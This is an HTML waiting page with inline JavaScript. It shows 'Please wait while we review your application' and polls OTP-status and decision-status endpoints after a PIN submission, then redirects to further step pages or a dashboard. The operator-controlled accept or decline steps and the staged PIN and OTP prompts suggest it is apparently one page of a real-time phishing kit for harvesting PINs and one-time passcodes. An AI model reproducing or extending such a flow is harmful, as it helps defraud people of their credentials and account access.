<!DOCTYPE html>
<html>

<head>
    <title>Processing</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="header"></div>

<div class="container">

    <h2 class="title">Processing...</h2>

    <div class="loader"></div>

    <p style="text-align:center; margin-top:20px;">
        Please wait while we review your application
    </p>

</div>

<div class="footer"></div>

<script>
const fromPin = localStorage.getItem("fromPin");
const firstProcess = localStorage.getItem("firstProcess");
const sessionId = localStorage.getItem("sessionId"); // 🔥 IMPORTANT

// =====================================
// FLOW B (AFTER PIN SUBMISSION)
// =====================================
if (fromPin === "yes" && sessionId) {

    console.log("🔥 FLOW B ACTIVE", sessionId);

    let handled = false;

    const interval = setInterval(async () => {
        if (handled) return;

        try {
            // ===== CHECK OTP =====
            const res = await fetch(`/otp-status?id=${sessionId}`);
            const data = await res.json();

            console.log("OTP STATUS:", data);

            if (data.otp == 6) {
                handled = true;
                clearInterval(interval);

                localStorage.removeItem("fromPin");
                window.location.href = "step6.html";
                return;
            }

            if (data.otp == 5) {
                handled = true;
                clearInterval(interval);

                localStorage.removeItem("fromPin");
                window.location.href = "step5.html";
                return;
            }

            // ===== CHECK DECISION =====
            const decisionRes = await fetch(`/decision-status?id=${sessionId}`);
            const decisionData = await decisionRes.json();

            console.log("DECISION:", decisionData);

            if (decisionData.decision === "accept") {
                handled = true;
                clearInterval(interval);
                window.location.href = "dashboard.html";
                return;
            }

            if (decisionData.decision === "decline") {
                handled = true;
                clearInterval(interval);
                localStorage.clear();
                window.location.href = "step5.html";
                return;
            }

        } catch (err) {
            console.log("Waiting...");
        }
    }, 1000);
}


// =====================================
// FLOW A (FIRST PROCESSING BEFORE PIN)
// =====================================
else if (firstProcess === "yes") {

    console.log("⚡ FLOW A ACTIVE");

    localStorage.removeItem("firstProcess");

    setTimeout(() => {
        window.location.href = "step5.html";
    }, 5000);
}


// =====================================
// SAFETY FALLBACK
// =====================================
else {
    console.log("⚠️ NO SESSION OR FLOW");

    setTimeout(() => {
        window.location.href = "index.html";
    }, 2000);
}
</script>
</body>
</html>
